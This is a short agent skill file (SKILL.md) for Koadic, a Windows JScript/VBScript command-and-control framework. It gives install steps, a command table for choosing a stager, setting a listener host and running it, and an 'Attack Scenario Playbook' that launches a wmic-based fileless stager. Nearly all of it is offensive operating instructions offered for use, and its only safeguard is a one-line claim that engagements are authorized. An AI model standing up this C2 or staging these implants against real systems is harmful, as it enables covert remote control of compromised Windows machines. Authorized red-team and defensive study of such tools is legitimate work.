---
name: koadic-c2
description: "Koadic provides a JScript/VBScript C2 framework. Signals: C2, command and control, C2 console, payload selection, listener."
zh-signals: "Koadic: JScript/VBScript C2。信号:c2,命令控制,C2 控制台,载荷选择,监听。"
when-to-use: "Use Koadic when conducting an authorized Windows post-exploitation engagement that requires a JScript/VBScript fileless C2 framework with staged implants and listeners."
---

# Koadic

- Attack Category: C35 C2 Frameworks and Remote Control
- Upstream Repository: https://github.com/zerosum0x0/koadic
- Upstream License: Apache-2.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/zerosum0x0/koadic && cd koadic && pip install -r requirements.txt
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python3 koadic` | C2 console |
| `use stager/js/implant` | Payload selection |
| `set SRVHOST 10.0.0.5` | Listener |
| `run` | Execute |

## Attack Scenario Playbook

### JScript/VBScript C2

```bash
python3 koadic && use stager/js/wmic
# COM-based fileless attack
```

## Notes

By zerosum0x0, a Windows fileless C2.
